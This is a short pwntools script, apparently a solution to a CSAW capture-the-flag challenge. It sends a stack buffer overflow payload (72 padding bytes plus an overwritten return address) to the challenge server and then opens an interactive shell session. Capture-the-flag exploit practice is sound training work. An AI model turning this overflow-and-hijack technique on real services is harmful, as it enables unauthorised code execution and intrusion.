#!/usr/bin/env python

from pwn import *

#r = remote('127.0.0.1', 4000)
r = remote('pwn.chal.csaw.io', 8000)

r.sendline('A'*72 + p64(0x40060d))

r.interactive()
